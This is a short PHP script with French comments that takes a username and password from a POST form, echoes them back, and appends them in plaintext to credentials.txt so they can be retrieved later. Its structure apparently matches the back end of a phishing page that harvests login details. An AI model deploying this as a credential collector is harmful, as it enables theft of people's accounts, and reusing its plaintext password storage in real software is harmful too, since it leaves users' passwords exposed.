<?php

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Récupérer les informations envoyées par le formulaire
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Afficher les informations pour vérifier qu'elles ont été reçues
    echo "Username: " . htmlspecialchars($username) . "<br>";
    echo "Password: " . htmlspecialchars($password) . "<br>";

    // Vous pouvez également enregistrer ces informations dans un fichier ou une base de données pour les récupérer plus tard
    // Exemple pour enregistrer dans un fichier (en ajoutant chaque entrée à un fichier texte)
    $file = 'credentials.txt';
    $file_handle = fopen($file, 'a');
    fwrite($file_handle, "Username: $username, Password: $password\n");
    fclose($file_handle);
} else {
    echo "No data received.";
}
?>
